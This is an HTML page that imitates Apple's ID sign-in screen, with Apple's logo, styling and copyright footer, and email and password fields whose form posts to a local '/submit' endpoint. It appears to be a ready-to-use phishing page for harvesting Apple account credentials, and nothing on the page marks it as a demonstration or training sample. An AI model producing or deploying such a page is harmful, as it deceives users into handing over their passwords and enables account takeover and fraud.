<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Apple ID - Sign In</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background-color: #f2f2f5;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 400px;
      margin: 100px auto;
      background-color: white;
      padding: 40px 30px;
      border-radius: 12px;
      box-shadow: 0 4px 16px rgba(0,0,0,0.1);
    }
    .logo {
      text-align: center;
      margin-bottom: 20px;
    }
    .logo img {
      width: 50px;
    }
    h2 {
      text-align: center;
      font-weight: 500;
      color: #1d1d1f;
      margin-bottom: 30px;
    }
    label {
      display: block;
      margin-bottom: 6px;
      color: #6e6e73;
      font-weight: 600;
      font-size: 14px;
    }
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      border: 1px solid #ced1d5;
      border-radius: 6px;
      box-sizing: border-box;
      font-size: 15px;
    }
    .button {
      background-color: #0071e3;
      color: white;
      padding: 12px;
      width: 100%;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
      font-weight: 600;
    }
    .button:hover {
      background-color: #005bb5;
    }
    .link {
      text-align: center;
      margin-top: 15px;
      font-size: 13px;
    }
    .link a {
      color: #0071e3;
      text-decoration: none;
    }
    .link a:hover {
      text-decoration: underline;
    }
    .footer {
      text-align: center;
      font-size: 11px;
      color: #888;
      margin-top: 40px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
    </div>
    <h2>Sign in with your Apple ID</h2>
    <form action="/submit" method="POST">
      <label for="email">Apple ID</label>
      <input type="email" id="email" name="email" placeholder="name@icloud.com" required>

      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="Password" required>

      <button type="submit" class="button">Sign In</button>
    </form>

    <div class="link">
      <a href="#">Forgot Apple ID or password?</a>
    </div>

    <div class="link" style="margin-top: 8px;">
      <a href="#">Create Apple ID</a> | 
      <a href="#">Help</a>
    </div>

    <div class="footer">
      Â© 2025 Apple Inc. | Privacy | Terms & Conditions
    </div>
  </div>
</body>
</html>
